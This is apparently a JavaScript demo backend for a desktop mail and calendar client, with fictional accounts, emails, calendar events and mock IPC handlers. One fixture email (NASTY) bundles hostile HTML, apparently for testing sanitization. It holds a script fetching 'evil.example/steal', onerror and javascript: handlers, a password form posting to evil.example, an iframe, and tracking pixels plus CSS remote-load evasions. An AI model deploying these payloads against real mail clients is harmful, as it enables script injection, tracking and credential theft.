/*
 * Demo backend used only in a plain browser (npm run dev:web) and for screenshots.
 * It mimics the real IPC surface with in-memory fictional data. It is not included in production builds.
 */
const H = 3600 * 1000;
const now = Date.now();
const ago = hours => new Date(now - hours * H).toISOString();

const accounts = [
  { id: 'a1', name: 'Alex Morgan', email: 'alex.morgan@example.com', user: 'alex.morgan@example.com', provider: 'gmail', color: '#0072c6', enabled: true, hasPassword: true, signature: 'Alex Morgan\nProduct Design',
    imap: { host: 'imap.gmail.com', port: 993, security: 'ssl' }, smtp: { host: 'smtp.gmail.com', port: 465, security: 'ssl' } },
  { id: 'a2', name: 'Alex Morgan', email: 'alex@northwind.example', user: 'alex@northwind.example', provider: 'other', color: '#d83b01', enabled: true, hasPassword: true, signature: '',
    imap: { host: 'mail.northwind.example', port: 993, security: 'ssl' }, smtp: { host: 'mail.northwind.example', port: 587, security: 'starttls' } },
  { id: 'a3', name: 'Alex M', email: 'alex.m@example.org', user: 'alex.m@example.org', provider: 'gmail', color: '#107c10', enabled: true, hasPassword: true, signature: '',
    imap: { host: 'imap.gmail.com', port: 993, security: 'ssl' }, smtp: { host: 'smtp.gmail.com', port: 465, security: 'ssl' } }
];

const FOLDERS = [
  ['INBOX', 'Inbox', '\\Inbox', 0], ['Drafts', 'Drafts', '\\Drafts', 1], ['Sent', 'Sent Items', '\\Sent', 2],
  ['Archive', 'Archive', '\\Archive', 3], ['Junk', 'Junk Email', '\\Junk', 5], ['Trash', 'Deleted Items', '\\Trash', 6]
];
const folders = {};
for (const a of accounts) {
  folders[a.id] = FOLDERS.map(([path, name, use, order]) => ({ path, name: path, delimiter: '/', parentPath: '', specialUse: use, selectable: true, displayName: name, order, subscribed: true }));
}
folders.a1.push({ path: 'Projects', name: 'Projects', delimiter: '/', parentPath: '', specialUse: '', selectable: true, displayName: 'Projects', order: 100, subscribed: true });
folders.a1.push({ path: 'Projects/Atlas', name: 'Atlas', delimiter: '/', parentPath: 'Projects', specialUse: '', selectable: true, displayName: 'Atlas', order: 100, subscribed: true });

const NASTY = `<div style="font-family:Arial">
<p>Hi Alex, quick note about your invoice.</p>
<script>document.title='pwned'; fetch('https://evil.example/steal')</script>
<img src="https://tracker.example/pixel.gif?u=alex" width="1" height="1">
<img src="x" onerror="document.title='pwned-onerror'">
<div style="background:url(https://tracker.example/bg.png);padding:8px;border:1px solid #ddd">Styled box with a remote background</div>
<div style="background:image-set('https://tracker.example/imageset.png' 1x);color:#333">image-set background</div>
<div style="background:u\\72l(https://tracker.example/escaped.png);color:#333">escaped url background</div>
<div style="background:-webkit-image-set(url(https://tracker.example/webkit-set.png) 1x)">webkit image-set</div>
<div style="list-style:cross-fade(url(https://tracker.example/fade.png), none, 50%)">cross-fade</div>
<style>@import url(https://tracker.example/sheet.css); @font-face{font-family:x;src:url(https://tracker.example/font.woff)} .x{color:red}</style>
<form action="https://evil.example/post"><input name="pw" value="x"><button>Click</button></form>
<iframe src="https://evil.example/frame"></iframe>
<a href="https://example.com/invoice/8841" onclick="alert(1)">View invoice #8841</a>
<a href="javascript:alert(2)">javascript link</a>
</div>`;

const NEWSLETTER = `<html><head><style>.wrap{max-width:560px;margin:auto;font-family:Georgia,serif} h1{color:#0b5394} .btn{display:inline-block;background:#0b5394;color:#fff;padding:10px 18px;border-radius:4px;text-decoration:none}</style></head><body>
<div class="wrap"><h1>The Design Digest</h1>
<img src="https://cdn.newsletter.example/hero.jpg" alt="Hero image" width="520" height="180" style="background:#dbe7f3">
<p>This week: five layouts that respect the reader, a look at variable fonts, and why we still love a good table.</p>
<table width="100%" cellpadding="8" style="border-collapse:collapse"><tr style="background:#f3f6fa"><th align="left">Topic</th><th align="left">Read time</th></tr>
<tr><td>Readable layouts</td><td>6 min</td></tr><tr><td>Variable fonts</td><td>9 min</td></tr><tr><td>In praise of tables</td><td>4 min</td></tr></table>
<p><a class="btn" href="https://newsletter.example/read/104">Read online</a></p>
<p style="font-size:12px;color:#777">You are receiving this because you subscribed. <a href="https://newsletter.example/unsub">Unsubscribe</a></p></div></body></html>`;

let uidCounter = 500;
const store = { a1: {}, a2: {}, a3: {} };
for (const a of accounts) for (const f of folders[a.id]) store[a.id][f.path] = [];

function add(accountId, path, { from, fromName, subject, hoursAgo, seen = false, flagged = false, attachments = [], html = '', text = '', to, listUnsub }) {
  const uid = ++uidCounter;
  const acc = accounts.find(a => a.id === accountId);
  const toAddr = to || [{ name: acc.name, address: acc.email }];
  const row = {
    key: `${accountId}|${path}|${uid}`, accountId, path, uid, subject,
    from: { name: fromName || '', address: from }, to: toAddr, date: ago(hoursAgo), size: 4000 + (uid % 40) * 900,
    seen, flagged, answered: false, draft: path === 'Drafts', hasAttachments: attachments.length > 0, messageId: `<${uid}@mock>`
  };
  store[accountId][path].push({ row, body: { html, text, attachments: attachments.map((a, i) => ({ index: i, ...a, inline: false })), listUnsubscribe: listUnsub || null } });
}

add('a1', 'INBOX', { from: 'priya.nair@example.net', fromName: 'Priya Nair', subject: 'Q4 roadmap review – slides attached', hoursAgo: 0.6, flagged: true,
  attachments: [{ filename: 'Q4-roadmap-review.pdf', contentType: 'application/pdf', size: 1843200 }, { filename: 'notes.txt', contentType: 'text/plain', size: 2100 }],
  text: 'Hi Alex,\n\nAttached are the slides for Thursday. Can you look at slide 7 (the timeline) before then? I moved the beta from 10/14 to 10/21 because of the security review.\n\nhttps://example.net/roadmap\n\nThanks,\nPriya' });
add('a1', 'INBOX', { from: 'digest@newsletter.example', fromName: 'The Design Digest', subject: 'Five layouts that respect the reader', hoursAgo: 2.2, html: NEWSLETTER,
  listUnsub: { http: 'https://newsletter.example/unsub' } });
add('a1', 'INBOX', { from: 'billing@northwind-cloud.example', fromName: 'Northwind Billing', subject: 'Invoice #8841 is ready', hoursAgo: 3.5, html: NASTY, text: 'Invoice ready' });
add('a1', 'INBOX', { from: 'jordan.lee@example.org', fromName: 'Jordan Lee', subject: 'Re: Lunch on Friday?', hoursAgo: 5, seen: true,
  text: 'Friday works for me. 12:30 at the usual place?\n\n> On Thu, Alex Morgan wrote:\n> Are you free for lunch on Friday?\n' });
add('a1', 'INBOX', { from: 'noreply@calendar.example', fromName: 'Calendar', subject: 'Invitation: Design sync @ Tue Sep 29, 2:00pm', hoursAgo: 20, seen: true, text: 'You have been invited to Design sync.' });
add('a1', 'INBOX', { from: 'sam.okafor@example.net', fromName: 'Sam Okafor', subject: 'Photos from the offsite', hoursAgo: 30, seen: true, attachments: [{ filename: 'offsite-01.jpg', contentType: 'image/jpeg', size: 3450000 }], text: 'Here are the best ones. The group photo is in the folder.' });
add('a1', 'INBOX', { from: 'support@hosting.example', fromName: 'Hosting Support', subject: 'Your ticket #55812 has been updated', hoursAgo: 52, seen: true, text: 'We have applied the change you requested.' });
add('a1', 'INBOX', { from: 'maria.silva@example.net', fromName: 'Maria Silva', subject: 'Welcome aboard!', hoursAgo: 120, seen: true, text: 'Welcome to the team. Let me know if you need anything on your first week.' });
add('a1', 'INBOX', { from: 'alerts@status.example', fromName: 'Status', subject: '[Resolved] Elevated error rates', hoursAgo: 200, seen: true, text: 'The incident has been resolved.' });
add('a1', 'Sent', { from: 'alex.morgan@example.com', fromName: 'Alex Morgan', subject: 'Re: Lunch on Friday?', hoursAgo: 6, seen: true, to: [{ name: 'Jordan Lee', address: 'jordan.lee@example.org' }], text: 'Are you free for lunch on Friday?' });
add('a1', 'Drafts', { from: 'alex.morgan@example.com', fromName: 'Alex Morgan', subject: 'Notes for the design review', hoursAgo: 8, seen: true, to: [{ name: '', address: 'team@example.com' }], text: 'Draft text…' });
add('a1', 'Trash', { from: 'spam@promo.example', fromName: 'Big Promo', subject: 'You won!', hoursAgo: 90, seen: true, text: 'Click here.' });

add('a2', 'INBOX', { from: 'ceo@northwind.example', fromName: 'Dana Whitfield', subject: 'All-hands moved to 3pm', hoursAgo: 1.1, text: 'Team,\n\nToday’s all-hands is now at 3pm. Same link.\n\nDana' });
add('a2', 'INBOX', { from: 'it@northwind.example', fromName: 'IT Helpdesk', subject: 'Password expires in 5 days', hoursAgo: 9, flagged: false, text: 'Your password will expire soon. Please change it.' });
add('a2', 'INBOX', { from: 'chris.wu@northwind.example', fromName: 'Chris Wu', subject: 'Re: Pricing page copy', hoursAgo: 26, seen: true, text: 'Looks good. One small edit in the second paragraph.' });
add('a2', 'INBOX', { from: 'hr@northwind.example', fromName: 'People Team', subject: 'Open enrollment reminder', hoursAgo: 75, seen: true, text: 'Open enrollment closes on the 15th.' });

add('a3', 'INBOX', { from: 'library@city.example.org', fromName: 'City Library', subject: 'Your hold is ready for pickup', hoursAgo: 4, text: 'The book you requested is ready at the front desk.' });
add('a3', 'INBOX', { from: 'friend@example.net', fromName: 'Taylor', subject: 'Weekend hike?', hoursAgo: 28, seen: true, text: 'Trail is open again. Saturday morning?' });

// ---- calendar ---------------------------------------------------------------
function dayAt(offset, h, m = 0) {
  const d = new Date(); d.setHours(h, m, 0, 0); d.setDate(d.getDate() + offset); return d;
}
function mondayOffset() { const d = new Date().getDay(); return d === 0 ? -6 : 1 - d; }
const mon = mondayOffset();
const calendars = [
  { id: 'c1', name: 'Work', type: 'url', url: 'https://calendar.example.com/work.ics', path: '', color: '#0072c6', enabled: true },
  { id: 'c2', name: 'Personal', type: 'url', url: 'https://calendar.example.com/personal.ics', path: '', color: '#107c10', enabled: true },
  { id: 'c3', name: 'Holidays', type: 'file', url: '', path: '/home/alex/holidays.ics', color: '#8764b8', enabled: true }
];
const events = [];
function ev(cal, title, start, end, extra = {}) {
  const c = calendars.find(x => x.id === cal);
  events.push({ id: `${cal}|${title}|${start.toISOString()}`, calendarId: cal, uid: title, title, location: '', description: '', allDay: false,
    start: start.toISOString(), end: end.toISOString(), busy: true, status: 'CONFIRMED', recurring: false, organizer: '', meetingUrl: '', color: c.color, calendarName: c.name, ...extra });
}
for (let i = 0; i < 4; i++) ev('c1', 'Daily Standup', dayAt(mon + i, 9), dayAt(mon + i, 9, 15), { recurring: true, meetingUrl: 'https://teams.microsoft.com/l/meetup-join/demo', location: 'Microsoft Teams Meeting' });
ev('c1', 'Design sync', dayAt(mon + 1, 14), dayAt(mon + 1, 15), { organizer: 'priya.nair@example.net', meetingUrl: 'https://meet.example.com/abc-defg', location: 'Google Meet' });
ev('c1', 'Roadmap review', dayAt(mon + 3, 10), dayAt(mon + 3, 11, 30), { organizer: 'priya.nair@example.net', location: 'Room 4B', description: 'Walk through the Q4 roadmap. Please read the slides beforehand.' });
ev('c1', '1:1 with Dana', dayAt(mon + 3, 10, 30), dayAt(mon + 3, 11), { location: 'Dana\'s office' });
ev('c1', 'Customer call – Acme', dayAt(mon + 3, 10, 45), dayAt(mon + 3, 11, 45), { meetingUrl: 'https://zoom.us/j/123456789' });
ev('c1', 'Focus time', dayAt(mon + 2, 13), dayAt(mon + 2, 16), { busy: false });
ev('c1', 'All-hands', dayAt(mon + 4, 15), dayAt(mon + 4, 16), { meetingUrl: 'https://teams.microsoft.com/l/meetup-join/demo2' });
ev('c2', 'Team lunch', dayAt(mon + 4, 12), dayAt(mon + 4, 13), { location: 'Tahoe Grill' });
ev('c2', 'Dentist', dayAt(mon + 2, 8), dayAt(mon + 2, 9), { location: 'Main St Dental' });
ev('c2', 'Weekend hike', dayAt(mon + 5, 8), dayAt(mon + 5, 12), { location: 'Ridge Trail' });
const key = d => `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
ev('c3', 'Office closed', dayAt(mon + 9, 0), dayAt(mon + 10, 0), { allDay: true, startDay: key(dayAt(mon + 9, 0)), endDay: key(dayAt(mon + 10, 0)), busy: false });
ev('c2', 'Conference trip', dayAt(mon + 1, 0), dayAt(mon + 3, 0), { allDay: true, startDay: key(dayAt(mon + 1, 0)), endDay: key(dayAt(mon + 3, 0)), busy: false });

// ---- API --------------------------------------------------------------------
let settings = { readingPane: 'right', markReadDelayMs: 1500, loadRemoteImages: false, notifications: true, checkIntervalSec: 90, listWidth: 380, theme: 'system' };
const ok = data => ({ ok: true, data });
const fail = error => ({ ok: false, error });
const uidsOf = u => (Array.isArray(u) ? u : [u]).map(Number);

function find(accountId, path, uid) {
  return (store[accountId][path] || []).find(m => m.row.uid === uid);
}
function page(rows, opts = {}) {
  let list = rows.slice().sort((a, b) => new Date(b.date) - new Date(a.date));
  if (opts.filter === 'unread') list = list.filter(r => !r.seen);
  if (opts.filter === 'flagged') list = list.filter(r => r.flagged);
  const q = (opts.query || '').toLowerCase();
  if (q) list = list.filter(r => `${r.subject} ${r.from.name} ${r.from.address}`.toLowerCase().includes(q));
  const offset = opts.offset || 0;
  const limit = opts.limit || 50;
  const rowsOut = list.slice(offset, offset + limit);
  return { rows: rowsOut, total: list.length, offset, hasMore: offset + rowsOut.length < list.length };
}
function moveTo(accountId, path, uids, dest) {
  for (const uid of uidsOf(uids)) {
    const list = store[accountId][path];
    const i = list.findIndex(m => m.row.uid === uid);
    if (i < 0) continue;
    const [m] = list.splice(i, 1);
    m.row.path = dest; m.row.key = `${accountId}|${dest}|${m.row.uid}`;
    store[accountId][dest] = store[accountId][dest] || [];
    store[accountId][dest].push(m);
  }
}

const handlers = {
  'accounts.list': () => accounts,
  'accounts.presets': () => ({
    gmail: { label: 'Gmail', imap: { host: 'imap.gmail.com', port: 993, security: 'ssl' }, smtp: { host: 'smtp.gmail.com', port: 465, security: 'ssl' }, note: 'Use a Google app password (Google Account > Security > 2-Step Verification > App passwords), not your normal password.' },
    yahoo: { label: 'Yahoo Mail', imap: { host: 'imap.mail.yahoo.com', port: 993, security: 'ssl' }, smtp: { host: 'smtp.mail.yahoo.com', port: 465, security: 'ssl' }, note: 'Use a Yahoo app password.' },
    icloud: { label: 'iCloud Mail', imap: { host: 'imap.mail.me.com', port: 993, security: 'ssl' }, smtp: { host: 'smtp.mail.me.com', port: 587, security: 'starttls' }, note: 'Use an app-specific password from appleid.apple.com.' },
    fastmail: { label: 'Fastmail', imap: { host: 'imap.fastmail.com', port: 993, security: 'ssl' }, smtp: { host: 'smtp.fastmail.com', port: 465, security: 'ssl' }, note: 'Use a Fastmail app password.' },
    other: { label: 'Other IMAP account', imap: { host: '', port: 993, security: 'ssl' }, smtp: { host: '', port: 465, security: 'ssl' }, note: '' }
  }),
  'accounts.save': ({ account }) => { const a = { ...account, id: account.id || `a${accounts.length + 1}`, hasPassword: true, color: account.color || '#8764b8', enabled: true }; const i = accounts.findIndex(x => x.id === a.id); if (i >= 0) accounts[i] = a; else { accounts.push(a); folders[a.id] = FOLDERS.map(([path, name, use, order]) => ({ path, name: path, delimiter: '/', parentPath: '', specialUse: use, selectable: true, displayName: name, order, subscribed: true })); store[a.id] = Object.fromEntries(FOLDERS.map(f => [f[0], []])); } return a; },
  'accounts.remove': (id) => { const i = accounts.findIndex(a => a.id === id); if (i >= 0) accounts.splice(i, 1); return true; },
  'accounts.test': () => ({ imap: { ok: true, folders: 6 }, smtp: { ok: true } }),
  'folders.list': (id) => folders[id] || [],
  'folders.counts': (id) => Object.fromEntries((folders[id] || []).map(f => { const l = store[id][f.path] || []; return [f.path, { messages: l.length, unseen: l.filter(m => !m.row.seen).length }]; })),
  'folders.create': (id, path) => { folders[id].push({ path, name: path.split('/').pop(), delimiter: '/', parentPath: path.includes('/') ? path.split('/').slice(0, -1).join('/') : '', specialUse: '', selectable: true, displayName: path.split('/').pop(), order: 100, subscribed: true }); store[id][path] = []; return { path }; },
  'folders.rename': () => ({}),
  'folders.delete': () => ({}),
  'folders.markRead': (id, path) => { for (const m of store[id][path] || []) m.row.seen = true; return true; },
  'messages.list': (id, path, opts) => page((store[id][path] || []).map(m => m.row), opts),
  'messages.unified': (opts = {}) => { const rows = accounts.filter(a => a.enabled).flatMap(a => (store[a.id].INBOX || []).map(m => m.row)); return { ...page(rows, opts), errors: [] }; },
  'messages.get': (id, path, uid) => {
    const m = find(id, path, uid);
    if (!m) throw new Error('That message no longer exists on the server.');
    const r = m.row;
    return { key: r.key, accountId: id, path, uid, subject: r.subject, from: [r.from], to: r.to, cc: [], bcc: [], replyTo: [], date: r.date, messageId: r.messageId, inReplyTo: '', references: [],
      html: m.body.html, text: m.body.text, attachments: m.body.attachments, listUnsubscribe: m.body.listUnsubscribe };
  },
  'messages.saveAttachment': () => ({ canceled: false, path: '/home/alex/Downloads/file' }),
  'messages.setFlags': (id, path, uids, flags) => { for (const uid of uidsOf(uids)) { const m = find(id, path, uid); if (!m) continue; if (typeof flags.seen === 'boolean') m.row.seen = flags.seen; if (typeof flags.flagged === 'boolean') m.row.flagged = flags.flagged; } return true; },
  'messages.move': (id, path, uids, dest) => { moveTo(id, path, uids, dest); return { moved: uidsOf(uids).length, destination: dest }; },
  'messages.trash': (id, path, uids, opts = {}) => { if (path === 'Trash') { if (!opts.permanent) throw new Error('These messages are already in Deleted Items. Confirm to delete them permanently.'); store[id].Trash = store[id].Trash.filter(m => !uidsOf(uids).includes(m.row.uid)); return { deleted: uidsOf(uids).length, permanent: true }; } moveTo(id, path, uids, 'Trash'); return { deleted: uidsOf(uids).length, permanent: false, destination: 'Trash' }; },
  'messages.archive': (id, path, uids) => { moveTo(id, path, uids, 'Archive'); return { archived: uidsOf(uids).length, destination: 'Archive' }; },
  'messages.junk': (id, path, uids) => { moveTo(id, path, uids, 'Junk'); return { destination: 'Junk' }; },
  'mail.send': (id, draft) => { add(id, 'Sent', { from: accounts.find(a => a.id === id).email, fromName: accounts.find(a => a.id === id).name, subject: draft.subject || '(no subject)', hoursAgo: 0, seen: true, to: draft.to, text: draft.text }); return { messageId: '<sent@mock>', accepted: draft.to.map(t => t.address), savedToSent: true }; },
  'mail.saveDraft': (id, draft) => { add(id, 'Drafts', { from: accounts.find(a => a.id === id).email, subject: draft.subject || '(no subject)', hoursAgo: 0, seen: true, to: draft.to, text: draft.text }); return { path: 'Drafts', uid: uidCounter }; },
  'mail.deleteDraft': () => true,
  'calendars.list': () => calendars,
  'calendars.save': (c) => { const rec = { ...c, id: c.id || `c${calendars.length + 1}`, color: c.color || '#b4009e', enabled: c.enabled !== false, url: c.url || '', path: c.path || '' }; const i = calendars.findIndex(x => x.id === rec.id); if (i >= 0) calendars[i] = rec; else calendars.push(rec); return rec; },
  'calendars.remove': (id) => { const i = calendars.findIndex(c => c.id === id); if (i >= 0) calendars.splice(i, 1); return true; },
  'calendars.check': () => ({ ok: true, name: 'Imported calendar', events: 12 }),
  'calendars.events': (start, end) => {
    const s = new Date(start).getTime(); const e = new Date(end).getTime();
    const enabled = new Set(calendars.filter(c => c.enabled).map(c => c.id));
    return { events: events.filter(x => enabled.has(x.calendarId) && new Date(x.end).getTime() >= s && new Date(x.start).getTime() < e), status: calendars.map(c => ({ calendarId: c.id, error: null, fetchedAt: now })) };
  },
  'calendars.pickFile': () => '/home/alex/Documents/team.ics',
  'settings.get': () => settings,
  'settings.set': (patch) => { settings = { ...settings, ...patch }; return settings; },
  'contacts.search': (q) => [{ name: 'Priya Nair', address: 'priya.nair@example.net' }, { name: 'Jordan Lee', address: 'jordan.lee@example.org' }, { name: 'Sam Okafor', address: 'sam.okafor@example.net' }, { name: 'Dana Whitfield', address: 'ceo@northwind.example' }]
    .filter(c => `${c.name} ${c.address}`.toLowerCase().includes(String(q).toLowerCase())),
  'ai.getConfig': () => ({ enabled: false, hasKey: false, usage: { drafts: 0, inputTokens: 0, outputTokens: 0 }, estimatedCostUsd: 0 }),
  'ai.setConfig': () => { throw new Error('Not available in the demo.'); },
  'ai.resetUsage': () => { throw new Error('Not available in the demo.'); },
  'ai.draft': () => { throw new Error('Not available in the demo.'); },
  'app.info': () => ({ version: '0.1.0', electron: 'demo', platform: 'linux', keyring: 'ok', dataDir: '~/.config/ClassicMail/data' }),
  'app.openExternal': (url) => { window.open(url, '_blank', 'noopener'); return true; },
  'app.checkNow': () => true,
  'compose.open': (init) => { try { localStorage.setItem('cmComposeInit', JSON.stringify(init)); } catch (_) { /* ignore */ } window.open(`${location.pathname}#compose`, '_blank', 'width=940,height=740'); return true; },
  'compose.init': () => { try { return JSON.parse(localStorage.getItem('cmComposeInit') || 'null'); } catch (_) { return null; } },
  'compose.close': () => { window.close(); return true; }
};

const api = {
  async invoke(name, ...args) {
    // A compose popup shares the main window's data, like the real main process does.
    const owner = window.opener && window.opener.__cmMock;
    if (owner && owner !== api && !name.startsWith('compose.')) return owner.invoke(name, ...args);
    const fn = handlers[name];
    if (!fn) return fail(`Unknown request: ${name}`);
    try {
      await new Promise(r => setTimeout(r, 40));
      return ok(fn(...args));
    } catch (err) {
      return fail(err.message || String(err));
    }
  },
  on() { return () => {}; }
};
window.__cmMock = api;

export default api;
